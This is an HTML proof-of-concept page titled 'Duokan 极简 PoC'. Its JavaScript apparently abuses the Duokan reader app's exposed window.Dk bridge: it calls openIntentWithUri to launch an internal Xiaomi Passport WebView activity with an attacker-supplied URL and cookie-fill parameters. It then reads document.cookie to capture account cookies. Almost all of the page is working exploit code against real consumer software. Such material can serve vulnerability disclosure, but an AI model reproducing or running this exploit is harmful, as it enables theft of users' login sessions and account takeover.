<!doctype html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Duokan 极简 PoC</title>
  <style>
    body{font-family:Arial,sans-serif;margin:16px}
    input,button{width:100%;margin:6px 0;padding:8px;box-sizing:border-box}
    pre{background:#111;color:#0f0;padding:10px;min-height:140px;white-space:pre-wrap}
  </style>
</head>
<body>
  <h3>Duokan 极简 PoC</h3>
  <input id="url" placeholder="Passport 页面 URL" />
  <input id="cookieUrl" placeholder="cookie_set_url" />
  <input id="sid" value="passportapi" placeholder="login_service_id" />
  <button onclick="testGate()">0) 测试桥可用性（getClientInfo + Settings）</button>
  <button onclick="launch()">1) 拉起 PassportJsbWebViewActivity</button>
  <button onclick="showCookie()">2) 读取 document.cookie</button>
  <pre id="log"></pre>
<script>
const logEl=document.getElementById('log');
const log=(...a)=>{logEl.textContent+=a.join(' ')+'\n';};
const qs=new URLSearchParams(location.search);
const selfUrl=location.origin+location.pathname;
document.getElementById('url').value=qs.get('url')||selfUrl;
document.getElementById('cookieUrl').value=qs.get('cookieUrl')||location.origin;
log('window.Dk =', typeof window.Dk);

function esc(v){return encodeURIComponent(v||'');}
function launch(){
  if(!window.Dk || !Dk.openIntentWithUri){ log('Dk.openIntentWithUri 不可用'); return; }
  const u=document.getElementById('url').value.trim();
  const cu=document.getElementById('cookieUrl').value.trim();
  const sid=document.getElementById('sid').value.trim();
  const intent='intent:#Intent;component=com.duokan.reader/com.xiaomi.passport.ui.internal.PassportJsbWebViewActivity;S.url='+esc(u)+';S.cookie_fill_cookie_set_url='+esc(cu)+';S.cookie_fill_account_device_params=true;S.cookie_fill_login_service_id='+esc(sid)+';S.action_bar_style=none;end';
  try{
    const ok=Dk.openIntentWithUri(intent);
    log('openIntentWithUri =>', ok);
    log('intent =', intent);
  }catch(e){ log('ERR', e.message); }
}

function testGate(){
  try{
    if(!window.Dk){ log('window.Dk 不存在'); return; }
    if(Dk.getClientInfo){
      const ci=Dk.getClientInfo();
      log('getClientInfo =', ci);
    }else{
      log('getClientInfo 不存在');
    }
    if(Dk.openIntentWithUri){
      const ok=Dk.openIntentWithUri('intent:#Intent;action=android.settings.SETTINGS;end');
      log('openIntent(SETTINGS) =>', ok);
    }else{
      log('openIntentWithUri 不存在');
    }
  }catch(e){ log('testGate ERR', e.message); }
}

function showCookie(){
  log('document.cookie =', document.cookie || '(empty)');
}
</script>
</body>
</html>
